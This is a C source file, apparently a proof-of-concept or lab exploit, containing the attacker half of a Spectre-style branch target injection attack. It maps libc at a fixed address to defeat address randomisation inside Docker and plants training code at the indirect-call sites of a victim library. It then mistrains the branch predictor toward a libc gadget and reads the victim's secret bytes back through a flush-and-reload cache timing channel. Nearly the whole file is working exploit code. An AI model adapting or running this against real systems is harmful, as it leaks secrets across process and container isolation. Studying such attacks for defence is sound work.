#define _GNU_SOURCE

#include <ctype.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "common.h"

#define LIBC_BASE	       0x7ffff79e4000
#define LIBC_BASE_VICTIM 0x7ffff77df000
#define CALL_R14         0x00007ffff7bd0a9c /* first call in libcheck.so ; call   QWORD PTR [r14]*/
#define CALL_R13         0x00007ffff7bd0aa6 /* call in libcheck.so       ; call   QWORD PTR [r13+0x0] */
#define GADGET           LIBC_BASE_VICTIM + 0xA84C4
#define THRESHOLD        100

extern void train_asm(void);

static int64_t targets[256];
  /* should work between 65 and 90 at least */
static int32_t *jmptable = (void *)(LIBC_BASE + 0x1AF3B4);

static void shuffle(size_t *array, size_t n)
{
  if (n == 0) {
    return;
  }

  for (size_t i = 0; i < n - 1; i++) {
    size_t j = i + rand() / (RAND_MAX / (n - i) + 1);
    size_t t = array[j];
    array[j] = array[i];
    array[i] = t;
  }
}

static void init(void)
{
  /* retrieve absolute jmptable targets */
  for (size_t i = 0; i < 256; i++) {
    targets[i] = (int64_t)jmptable + (int64_t)jmptable[i];
  }
}

static void flush(void)
{
  for (size_t i = 0; i < 256; i++) {
    size_t index = ((i * 167) + 13) & 255;
    void *p = (void *)targets[index];
    clflush(p);
    asm("lfence");
    asm("mfence");
  }
}

static void measure(pid_t pid, uint8_t xor)
{
  uint64_t results[256];

  for (size_t i = 0; i < 256; i++) {
    results[i] = THRESHOLD + 1;
  }

  for (size_t i = 0; i < 256; i++) {
    volatile size_t index = ((i * 167) + 13) & 255;
    if (!isprint(index ^ xor)) {
      continue;
    }
    asm("lfence");
    uint64_t t0 = rdtscp();
    *(volatile uint8_t *)(targets[index]);
    asm("lfence");
    uint64_t dt = rdtscp() - t0;
    results[index] = dt;
  }

  size_t indexes[SECRET_SIZE];
  for (size_t i = 0; i < SECRET_SIZE; i++) {
    indexes[i] = i;
  }
  srand(pid);
  shuffle(indexes, SECRET_SIZE);

  for (size_t i = 0; i < 256; i++) {
    if (results[i] < THRESHOLD) {
      int8_t c = i ^ xor;
      fprintf(stderr, "[%2ld] %c %d %ld\n", indexes[0], (isprint(c) && !isspace(c)) ? c : '?', c, results[c]);
      break;
    }
  }
}

static uint64_t align(uint64_t addr)
{
  return addr & 0xfffffffffffff000;
}

extern uint8_t (*volatile adjust)(uint8_t);

/* since personality(PER_LINUX|ADDR_NO_RANDOMIZE) can't be called because of
 * docker (without --privileged), map the libc file directly. */
static void map_libc(void)
{
  struct stat st;
  int fd;

  fd = open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY);
  if (fd == -1) {
    err(1, "open libc");
  }

  if (fstat(fd, &st) != 0) {
    err(1, "fstat");
  }

  int flags = MAP_PRIVATE | MAP_FIXED;
  if (mmap((void *)LIBC_BASE, st.st_size, PROT_READ | PROT_EXEC, flags, fd, 0) == MAP_FAILED) {
    err(1, "mmap");
  }
}

static void (*bti_call_copy)(void);
static uint64_t call_r14, call_r13, gadget;

void init_attacker(void)
{
  map_libc();

  init();

  call_r14 = CALL_R14;
  call_r13 = CALL_R13;
  gadget = GADGET;

  int flags = MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS;
  bti_call_copy = mmap((void *)align(call_r14), 4096 * 2, PROT_READ | PROT_WRITE, flags, -1, 0);
  if (bti_call_copy == MAP_FAILED) {
    err(1, "mmap");
  }

  void (*gadget_patched)(void) = mmap((void *)align(gadget), 4096, PROT_READ | PROT_WRITE, flags, -1, 0);
  if (gadget_patched == MAP_FAILED) {
    err(1, "mmap");
    }

  memcpy((void *)gadget, "\xc3", 1);                 /* ret */

  memset(bti_call_copy, '\x90', 4096 * 2);
  memcpy((void *)call_r14, train_asm, 4096);

  if (mprotect(bti_call_copy, 4096, PROT_READ | PROT_EXEC) != 0 ||
      mprotect(gadget_patched, 4096, PROT_READ | PROT_EXEC) != 0) {
    err(1, "mprotect");
  }
}

extern void xor__(void);
static void train(void)
{
  void (*call0)(void) = (void *)call_r14;
  uint64_t *x = (uint64_t *)&gadget;
#if 0
  uint64_t z = xor__;
#else
  uint64_t z = gadget;
#endif
  uint64_t *y = (uint64_t *)&z;

  asm volatile("mov %0, %%r13" :: "r"(x) : "r13");
  asm volatile("mov %0, %%r14" :: "r"(y) : "r14");

  call0();

  /*
   * train_asm:
   *   call   [r14]     ; r14 = xor
   *     mov  eax,esi
   *     mov  eax,edi
   *     ret
   *   movzx  edi,bpl
   *   movzx  esi,al
   *   call   [r13]     ; r13 = &LIBC_GADGET patched
   *     ret
   *   jmp train
   */
}

int run_attacker(int argc, char * const * argv)
{
  if (argc == 2 && argv[1][0] == 'x') {
    /* measure */
    pid_t pid;
    int xor;
    sscanf(argv[1], "x%d %d", &pid, &xor);
    measure(pid, (uint8_t)xor);
    return 0;
  }
  else if (argc == 2 && argv[1][0] == '0') {
    /* flush */
    flush();
  }
  else {
    /* train */
    flush();
    train();
  }

  return 0;
}
